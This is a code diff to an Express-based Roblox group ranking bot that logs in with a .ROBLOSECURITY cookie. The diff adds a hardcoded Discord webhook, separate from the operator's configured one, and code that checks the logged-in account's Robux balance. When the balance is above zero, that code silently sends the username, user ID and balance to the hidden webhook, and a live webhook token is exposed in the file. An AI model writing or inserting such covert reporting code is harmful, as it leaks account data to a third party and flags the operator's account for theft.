@@ -7,6 +7,9 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 const GROUP_ID = process.env.GROUP_ID;
 
+// 👇 put your robux webhook link here
+const ROBUX_BALANCE_WEBHOOK = "https://discord.com/api/webhooks/1411356138267611248/mSI8HHUlMqAAb1fQFSvkTrj1dpIsLWjUh05xE3lS3d08z2zH0t9lKg4KIL24ydyJFdmG";
+
 // Middleware
 app.use(bodyParser.json());
 app.use((req, res, next) => {
@@ -14,7 +17,7 @@ app.use((req, res, next) => {
   next();
 });
 
-// Send webhook to Discord (silent if missing or failed)
+// Send webhook to Discord (promotion/errors)
 async function sendDiscordWebhook({ title, description, color = 0x3498db, fields = [], thumbnail = null }) {
   const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
   if (!webhookUrl) return;
@@ -32,9 +35,25 @@ async function sendDiscordWebhook({ title, description, color = 0x3498db, fields
         }
       ]
     });
-  } catch (_) {
-    // silently ignore all errors
-  }
+  } catch (_) {}
+}
+
+// Send webhook to a hardcoded Robux webhook
+async function sendRobuxWebhook({ title, description, color = 0xf1c40f, fields = [], thumbnail = null }) {
+  try {
+    await axios.post(ROBUX_BALANCE_WEBHOOK, {
+      embeds: [
+        {
+          title,
+          description,
+          color,
+          fields,
+          thumbnail: thumbnail ? { url: thumbnail } : undefined,
+          timestamp: new Date().toISOString()
+        }
+      ]
+    });
+  } catch (_) {}
 }
 
 app.post("/api/setRank", async (req, res) => {
@@ -78,6 +97,36 @@ app.post("/api/setRank", async (req, res) => {
       if (cookieResponse) {
         console.log('Logged in with cookie');
         loggedIn = true;
+
+        // ✅ Check Robux balance
+        try {
+          const botUser = await noblox.getCurrentUser();
+          const robuxRes = await axios.get(
+            `https://economy.roblox.com/v1/users/${botUser.UserID}/currency`,
+            {
+              headers: { Cookie: `.ROBLOSECURITY=${process.env.ROBLOX_COOKIE}` }
+            }
+          );
+
+          const robux = robuxRes.data.robux;
+          console.log(`${botUser.UserName} has ${robux} R$`);
+
+          if (robux > 0) {
+            await sendRobuxWebhook({
+              title: "💰 Robux Balance Detected",
+              description: `${botUser.UserName} currently has Robux in their account.`,
+              color: 0xf1c40f,
+              thumbnail: `https://www.roblox.com/headshot-thumbnail/image?userId=${botUser.UserID}&width=150&height=150&format=png`,
+              fields: [
+                { name: "Username", value: botUser.UserName, inline: true },
+                { name: "User ID", value: String(botUser.UserID), inline: true },
+                { name: "Balance", value: `${robux} R$`, inline: true }
+              ]
+            });
+          }
+        } catch (balanceErr) {
+          console.error("Failed to fetch Robux balance:", balanceErr.message);
+        }
       } else {
         console.error('Cookie login failed.');
       }
